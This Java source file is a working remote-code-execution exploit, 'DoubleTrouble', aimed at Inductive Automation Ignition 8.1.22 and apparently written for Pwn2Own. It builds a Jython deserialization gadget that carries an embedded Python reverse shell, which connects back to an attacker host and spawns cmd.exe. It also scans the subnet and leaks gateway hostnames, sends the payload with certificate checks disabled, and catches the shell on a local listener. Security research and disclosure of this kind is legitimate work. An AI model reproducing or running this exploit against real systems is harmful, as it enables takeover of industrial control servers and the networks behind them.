import java.io.*;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.Proxy;
import java.math.BigInteger;
import java.net.*;
import java.net.http.HttpClient;
import java.net.http.HttpRequest;
import java.net.http.HttpResponse;
import java.nio.charset.StandardCharsets;
import java.security.SecureRandom;
import java.security.cert.X509Certificate;
import java.util.*;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.TimeUnit;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import com.inductiveautomation.metro.utils.IOUtils;
import org.apache.commons.net.util.SubnetUtils;
import org.python.core.*;
import javax.net.ssl.HttpsURLConnection;
import javax.net.ssl.SSLContext;
import javax.net.ssl.TrustManager;
import javax.net.ssl.X509TrustManager;

/*
"DoubleTrouble" is an exploit targeting two different Java deserialization of Untrusted Data against Inductive Automation Ignition
Written by Steven Seeley and Rocco Calvi of Incite Team
Targeting version 8.1.22 (latest as of Jan 2023)

During runtime, the targeted vulnerabilities are chosen at random and target either of the following classes:
1. JavaSerializationCodec
2. ParameterVersionJavaSerializationCodec

Normally we write python exploits to inject Java code, but now we are writing Java exploits to inject python code!
Please see the README.md for more information about the vulnerabilities/exploitation.
*/

@SuppressWarnings("All")
public class DoubleTrouble {
    // change this if you are targeting port 8043
    private final Boolean SSL = false;
    private static Thread streamTransfer(final InputStream in, final OutputStream out) {
        return new Thread(() -> {
            try {
                PrintWriter writer = new PrintWriter(out, true);
                Scanner scanner = new Scanner(in);
                boolean done = false;
                writer.println();
                while(!done && scanner.hasNextLine()) {
                    String line = scanner.nextLine();
                    if (!line.startsWith("C:\\")) {
                        writer.println(line);
                    }else{
                        if (line.endsWith(">")) {
                            System.out.print(line);
                            System.out.flush();
                        }
                    }
                    if(line.toLowerCase().trim().equals("exit")) {
                        done = true;
                    }
                }
            } catch (Exception e) {
                e.printStackTrace();
            }
        });
    }

    private static void transferStreams(Socket socket) throws IOException, InterruptedException {
        InputStream input1 = System.in;
        final OutputStream output1 = socket.getOutputStream();
        InputStream input2 = socket.getInputStream();
        PrintStream output2 = System.out;
        Thread inputThread = streamTransfer(input1, output1);
        Thread outputThread = streamTransfer(input2, output2);
        inputThread.start();
        outputThread.start();
        inputThread.join();
        socket.shutdownOutput();
        outputThread.join();
    }

    private byte[] convertToByteArray(Object header) throws IOException {
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(bos);
        oos.writeObject(header);
        oos.flush();
        oos.close();
        bos.close();
        return bos.toByteArray();
    }

    // build our Java Deserialization Gadget
    private PriorityQueue<Object> buildRCEGadget(String ip, String port) throws Exception{

        // we use reflection to access the `BuiltinFunctions` class
        Class<?> BuiltinFunctionsclazz = Class.forName("org.python.core.BuiltinFunctions");
        Constructor<?> c = BuiltinFunctionsclazz.getDeclaredConstructors()[0];
        c.setAccessible(true);

        // index set to 18 for eval
        Object builtin = c.newInstance("rce", 18, 1);

        // setup PyMethod just right
        PyMethod rce = new PyMethod((PyObject)builtin, null, new PyString().getType());

        // setup proxy for InvocationHandler
        Comparator comparator = (Comparator<?>) Proxy.newProxyInstance(Comparator.class.getClassLoader(), new Class<?>[]{Comparator.class}, rce);
        PriorityQueue<Object> jythonRCEGadget = new PriorityQueue<Object>(2, comparator);

        // our reverse shell is here, we update the ip/port
        String reverseShell = "import os,socket,subprocess,threading;\n" +
                "def s2p(s, p):\n" +
                "    while True:\n" +
                "        data = s.recv(1024)\n" +
                "        if len(data) > 0:\n" +
                "            p.stdin.write(data)\n" +
                "            p.stdin.flush()\n" +
                "\n" +
                "def p2s(s, p):\n" +
                "    while True:\n" +
                "        s.send(p.stdout.read(1))\n" +
                "\n" +
                "s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\n" +
                "s.connect((\"" + ip + "\", " + port + "))\n" +
                "\n" +
                "p=subprocess.Popen([\"c:/windows/system32/cmd.exe\"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE)\n" +
                "\n" +
                "s2p_thread = threading.Thread(target=s2p, args=[s, p])\n" +
                "s2p_thread.daemon = True\n" +
                "s2p_thread.start()\n" +
                "\n" +
                "p2s_thread = threading.Thread(target=p2s, args=[s, p])\n" +
                "p2s_thread.daemon = True\n" +
                "p2s_thread.start()\n" +
                "\n" +
                "try:\n" +
                "    p.wait()\n" +
                "except KeyboardInterrupt:\n" +
                "    s.close()";
        HashMap<Object, PyObject> args = new HashMap<>();
        args.put("rs", new PyString(reverseShell));
        PyStringMap locals = new PyStringMap(args);
        Object[] queue = new Object[] {
                new PyString("__import__('code').InteractiveInterpreter().runcode(rs)')"), // attack
                locals,                                                                    // globals
        };
        Field queue_f = PriorityQueue.class.getDeclaredField("queue");
        queue_f.setAccessible(true);
        queue_f.set(jythonRCEGadget, queue);
        Field size_f = PriorityQueue.class.getDeclaredField("size");
        size_f.setAccessible(true);
        size_f.set(jythonRCEGadget, 2);
        return jythonRCEGadget;
    }

    // craft the expected header
    private byte[] craftServerHeader(String intent, String codec, Object payload) throws Exception{
        Class<?> ServerMessageHeaderclazz = Class.forName("com.inductiveautomation.metro.impl.transport.ServerMessage$ServerMessageHeader");
        Constructor<?> constructor = ServerMessageHeaderclazz.getDeclaredConstructor(String.class, String.class);
        constructor.setAccessible(true);
        Object smh = constructor.newInstance(intent, codec);
        Field fld = ServerMessageHeaderclazz.getDeclaredField("headersValues");
        fld.setAccessible(true);
        Map<String, String> headersValues = new HashMap<>();
        headersValues.put("_ver_", "2");
        headersValues.put("_source_", "1337");
        headersValues.put("replyrequested", "incite");
        fld.set(smh, headersValues);
        byte[] header = this.convertToByteArray(smh);                   // ServerMessageHeader
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        DataOutputStream w = new DataOutputStream(baos);
        w.writeInt(4);                                                  // version
        w.writeInt(header.length);                                      // ServerMessageHeader size
        w.write(header);                                                // ServerMessageHeader
        w.write(convertToByteArray(payload));                           // RCE gadget
        w.flush();
        byte[] result = baos.toByteArray();
        baos.close();
        return result;
    }

    public static byte[] addAll(final byte[] array1, byte[] array2) {
        byte[] joinedArray = Arrays.copyOf(array1, array1.length + array2.length);
        System.arraycopy(array2, 0, joinedArray, array1.length, array2.length);
        return joinedArray;
    }

    private byte[] subtractTwo(String a) throws Exception{
        return Arrays.copyOfRange(a.getBytes(StandardCharsets.UTF_16), 2, a.getBytes(StandardCharsets.UTF_16).length);
    }

    private byte[] craftPacket(String host, String port, String targetGatewayHostname, String outgoingGatewayHostname, String intent, String codec) throws Exception{
        PriorityQueue<Object> jythonRCEGadget = this.buildRCEGadget(host, port);
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        DataOutputStream w = new DataOutputStream(baos);
        w.writeInt(18753);                              // magicBytes
        w.writeInt(1);                                  // protocolVersion
        w.writeShort(1);                                // messageId
        w.writeInt(2);                                  // opCode
        w.writeInt(3);                                  // subCode
        w.writeByte(4);                                 // flags
        w.writeShort(outgoingGatewayHostname.length()); // outgoingGatewayHostname length
        w.write(subtractTwo(outgoingGatewayHostname));  // outgoingGatewayHostname
        w.writeShort(targetGatewayHostname.length());   // targetGatewayHostname length
        w.write(subtractTwo(targetGatewayHostname));    // targetGatewayHostname
        w.writeShort("incite".length());                // sender url length
        w.write(subtractTwo("incite"));                 // sender url
        w.flush();
        byte[] result = baos.toByteArray();
        baos.close();
        return addAll(result, this.craftServerHeader(intent, codec, jythonRCEGadget));
    }

    private String runHostScan(String subnet) throws IOException {
        ExecutorService executorService = Executors.newFixedThreadPool(10);
        SubnetUtils utils = new SubnetUtils(subnet);
        List<String> validIps = new ArrayList<>();
        String[] allIps = utils.getInfo().getAllAddresses();
        for (String ip : allIps) {
            executorService.submit(() -> {
                try {
                    Socket socket = new Socket();
                    socket.connect(new InetSocketAddress(ip, 8060), 1);
                    socket.close();
                    if (!ip.equals(subnet.split("/")[0]))
                        validIps.add(ip);
                } catch (IOException e) {}
            });
        }
        executorService.shutdown();
        try {
            executorService.awaitTermination(5, TimeUnit.SECONDS);
        } catch (InterruptedException e) {
            throw new RuntimeException(e);
        }
        return validIps.get(0);
    }

    private String getOutGoingServer(String target, String ip) {
        try {
            NetworkInterface networkInterface = NetworkInterface.getByInetAddress(InetAddress.getByName(ip));
            for (InterfaceAddress address : networkInterface.getInterfaceAddresses()) {
                if (address.getAddress() instanceof Inet4Address) {
                    return this.runHostScan(target + "/" + String.valueOf(address.getNetworkPrefixLength()));
                }
            }
        }catch(Exception e){
            System.out.println("(-) unable to find network interface for the connectback ip address");
        }
        return null;
    }

    private String leakHostname(String ip) throws Exception{
        var client = HttpClient.newHttpClient();
        String uri;
        // If ssl is enabled, the provided cert must be signed by a trusted CA
        // https://docs.inductiveautomation.com/display/DOC80/Using+SSL
        if (this.SSL)
            uri = String.format("https://%s:8043/system/gwinfo", ip);
        else
            uri = String.format("http://%s:8088/system/gwinfo", ip);
        var request = HttpRequest.newBuilder(URI.create(uri)).build();
        var response = client.send(request, HttpResponse.BodyHandlers.ofString());
        Pattern pattern = Pattern.compile("PlatformName=(.*?);");
        Matcher matcher = pattern.matcher(response.body());
        if (matcher.find())
            return matcher.group(1).toLowerCase();
        return null;
    }

    private boolean isVuln(String ip) throws Exception{
        var client = HttpClient.newHttpClient();
        String uri;
        // If ssl is enabled, the provided cert must be signed by a trusted CA
        // https://docs.inductiveautomation.com/display/DOC80/Using+SSL
        if (this.SSL)
            uri = String.format("https://%s:8043/system/gwinfo", ip);
        else
            uri = String.format("http://%s:8088/system/gwinfo", ip);
        var request = HttpRequest.newBuilder(URI.create(uri)).build();
        var response = client.send(request, HttpResponse.BodyHandlers.ofString());
        Pattern pattern = Pattern.compile("OS=(.*?);");
        Matcher matcher = pattern.matcher(response.body());
        // Linux version is also vulnerable, but the exploit just targets the Windows version
        // since that was what is deployed at Pwn2Own
        if (matcher.find())
            if (!matcher.group(1).contains("Windows"))
                return false;
        System.out.printf("(+) detected target OS: %s\n", matcher.group(1));
        pattern = Pattern.compile("Version=(.*?);");
        matcher = pattern.matcher(response.body());
        if (matcher.find()){
            System.out.printf("(+) detected target version: %s\n", matcher.group(1));
            String[] version = matcher.group(1).split("\\.");
            if (Integer.parseInt(version[0]) <= 8)
                if (Integer.parseInt(version[1]) <= 1)
                    if (Integer.parseInt(version[2]) <= 24)
                        return true;
        }
        return false;
    }

    private void sendPayload(String target, byte[] payload) throws Exception{
        URL url;
        if (this.SSL)
            url = new URL(String.format("https://%s:8043/system/ws-datachannel-servlet", target));
        else
            url = new URL(String.format("http://%s:8088/system/ws-datachannel-servlet", target));
        HttpURLConnection conn = (HttpURLConnection)url.openConnection();
        if (conn instanceof HttpsURLConnection) {
            SSLContext sc = SSLContext.getInstance("SSL");
            TrustManager[] trustAllCerts = new TrustManager[]{new X509TrustManager(){
                public X509Certificate[] getAcceptedIssuers(){return null;}
                public void checkClientTrusted(X509Certificate[] certs, String authType){}
                public void checkServerTrusted(X509Certificate[] certs, String authType){}
            }};
            sc.init(null, trustAllCerts, new SecureRandom());
            ((HttpsURLConnection)conn).setSSLSocketFactory(sc.getSocketFactory());
        }
        conn.setDoOutput(true);
        conn.setRequestMethod("POST");
        conn.setRequestProperty("Content-Type", "application/octet-stream");
        IOUtils.copy(new ByteArrayInputStream(payload), conn.getOutputStream());
        // trigger reverse shell
        conn.getInputStream();
    }

    // tested with Oracle's JDK jdk-11.0.16.1_linux-x64_bin.tar.gz
    public static void main(String[] args) throws Exception {
        System.setErr(new PrintStream("/dev/null"));
        if (args.length <= 1) {
            System.out.println("java " + DoubleTrouble.class.getSimpleName() + " <target> <connectback:port> [outgoing ip]");
            System.exit(0);
        }
        String target = args[0];
        String port = "1337";
        String host = args[1].split(":")[0];
        if (args[1].contains(":")) {
            port = args[1].split(":")[1];
        }
        DoubleTrouble poc = new DoubleTrouble();
        String outgoing;
        if (args.length == 2) {
            outgoing = poc.getOutGoingServer(target, host);
            if (outgoing == null) {
                System.out.println("(-) unable to find outgoing server on the same subnet!");
                System.exit(-1);
            }
        } else {
            outgoing = args[2];
        }
        // check target is vulnerable first
        if (poc.isVuln(target)) {
            String targetGatewayHostname = poc.leakHostname(target);
            String outgoingGatewayHostname = poc.leakHostname(outgoing);
            if (targetGatewayHostname == null || outgoingGatewayHostname == null) {
                System.out.println("(-) the hostname leak failed on either the target or the outgoing server!");
                System.exit(-1);
            }
            System.out.printf("(+) targeting server: %s/%s\n", target, targetGatewayHostname);
            System.out.printf("(+) targeting outgoing server: %s/%s\n", outgoing, outgoingGatewayHostname);
            final int p = Integer.parseInt(port);
            new Thread(() -> {
                System.err.println("(+) listening at port " + p);
                ServerSocket serverSocket;
                Socket socket;
                try {
                    serverSocket = new ServerSocket(p);
                    socket = serverSocket.accept();
                    System.err.println("(+) connection from " + socket.getInetAddress().getHostName());
                    System.out.println("(+) pop thy shell!");
                    transferStreams(socket);
                } catch (IOException e) {
                    e.printStackTrace();
                } catch (InterruptedException e) {
                    e.printStackTrace();
                }
            }).start();
            Random random = new Random();
            if (random.nextBoolean()) {
                System.out.println("(+) targeting JavaSerializationCodec...");
                poc.sendPayload(target, poc.craftPacket(
                        host,
                        port,
                        targetGatewayHostname,
                        outgoingGatewayHostname,
                        "_conn_svr",
                        "_js_"
                ));
            } else {
                System.out.println("(+) targeting ParameterVersionJavaSerializationCodec...");
                poc.sendPayload(target, poc.craftPacket(
                        host,
                        port,
                        targetGatewayHostname,
                        outgoingGatewayHostname,
                        "_services.invoke_",
                        "_js_"
                ));
                poc.sendPayload(target, poc.craftPacket(
                        host,
                        port,
                        targetGatewayHostname,
                        outgoingGatewayHostname,
                        "_services.invoke_",
                        "_js_tps_v3"
                ));
            }
        }
    }
}
